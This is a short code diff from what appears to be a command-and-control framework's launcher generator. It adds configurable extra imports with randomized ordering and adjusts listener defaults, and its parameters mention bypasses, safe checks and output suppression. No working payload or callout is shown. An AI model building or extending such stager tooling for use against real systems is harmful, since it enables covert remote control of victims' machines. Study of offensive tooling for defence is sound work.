@@ -24,12 +24,17 @@ log = logging.getLogger(__name__)
 class LauncherGen(object):
     def __init__(self, host: str, port: int, path: str,
                  ua: str, cookie: str, key: str, headers: [], proxies: [], funcs: [str], extra: {}):
-        log.error(extra)
         self.funcs = funcs
         # sourcery skip: low-code-quality
-        self.imports_list = ['os', 'sys', 're', 'subprocess', 'urllib.request', 'hmac']
+        self.imports_list = ['os', 'sys', 're', 'subprocess', 'urllib.request']
         random.shuffle(self.imports_list)
-        self.imports = 'import ' + ', '.join(self.imports_list)
+        self.extra_import = [x.replace('import ', '') for x in extra['import_list']] if 'import_list' in extra else []
+        random.shuffle(self.extra_import)
+        self.extra_for_import = extra['from_list'] if 'from_list' in extra else []
+        random.shuffle(self.extra_for_import)
+        self.imports_list += self.extra_import
+        self.imports = 'import ' + ', '.join(set(self.imports_list)) + '\n' + '\n'.join(self.extra_for_import)
+        log.error(self.imports)
         self.static = '''
 class Dnull:
     def write(self, msg):
@@ -305,7 +310,7 @@ class Listener(object):
             safeChecks="",
             listenerName=None,
             bypasses: List[str] = None,
-            build_arch='win',
+            build_arch='',
             extra=None
     ):
         """
